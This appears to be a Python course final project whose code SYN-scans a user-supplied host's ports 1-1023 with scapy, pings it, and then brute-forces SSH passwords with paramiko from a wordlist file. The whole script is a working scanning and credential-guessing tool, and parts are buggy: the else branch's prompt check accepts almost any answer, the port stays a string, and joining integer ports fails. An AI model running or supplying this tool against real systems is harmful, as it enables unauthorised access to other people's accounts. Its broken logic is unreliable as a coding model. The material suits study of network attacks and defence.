# HackerU Python: Final Project
import scapy.all as scapy  # Task 3
from scapy.layers.inet import IP, TCP, ICMP  # Task editor support
import paramiko  # Task 25


def scan_port(port: int, target: str) -> bool:  # Task 7.1
    """Scan target on given port using simple SYN scan."""
    src_port = scapy.RandShort()  # Task 7.2
    response: IP = scapy.sr1(IP(dst=target) / TCP(sport=src_port, dport=port, flags="S"), timeout=0.5)  # Task 9
    if not response:  # Task 10
        return False
    elif response.getlayer(TCP).flags & 2:  # Task 11 & 12
        scapy.sr1(IP(dst=target) / TCP(sport=src_port, dport=port, flags="R"), timeout=2)  # Task 13

        print(port)  # Task 23
        return True


def is_available(target: str) -> bool:  # Task 14
    """Checks if target is available (responds to ICMP ping)"""
    try:  # Task 15
        response = scapy.sr1(IP(dst=target) / ICMP(), timeout=3)  # Task 18
    except Exception as ex:
        print(ex)  # Task 16
        return False

    if response:  # Task 19
        return True


def bruteforce(target: str, port: int, username: str, passwords: list[str]) -> None:  # Task 26
    """Bruteforce password on SSH target using given username and password list"""
    connection = paramiko.SSHClient()  # Task 30
    connection.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Task 31

    for password in passwords:  # Task 32
        try:  # Task 33
            connection.connect(target, port=port, username=username, password=password, timeout=1)  # Task 34
            print("---> Success with:", password)  # Task 35
            break  # Task 37
        except:
            print("Failed:", password)

    connection.close()  # Task 36


if __name__ == "__main__":
    scapy.conf.verb = 0  # Task 8 & 17
    target = input("What's the Target? ")  # Task 4
    open_ports = []  # Task 6

    if not is_available(target):  # Task 20
        print(f"Target {target} doesn't seem to be available :(")
        exit()  # Task the host doesn't respond to ICMP requests

    open_ports = [port for port in range(1, 1024) if scan_port(port, target)]  # Task 5 & 21

    print("Scan finished.", f"Open Ports ({len(open_ports)})" if open_ports else "No open ports found")  # Task 24

    if not open_ports:  # Task no open ports found
        exit()

    with open("PasswordList.txt", "r", encoding="utf-8") as file:  # Task 27
        passwords = [p.strip() for p in file.readlines()]  # Task 28

    if 22 in open_ports:  # Task 38
        if input("Port 22 is Open. Would you like to bruteforce it now? (y/N) ").lower() == "y":  # Task 39 & 40
            bruteforce(
                target=target, port=22, username=input("What's the SSH Username to bruteforce? "), passwords=passwords
            )  # Task 29
    else:
        if input("Port 22 appears Closed. Would you like to bruteforce anyway different port? (y/N)").lower():
            bruteforce(
                target=target,
                port=input(f"Which port do you want to attack? ({', '.join(open_ports)}) "),
                username=input("What's the SSH Username to bruteforce? "),  # Task 29
                passwords=passwords,
            )
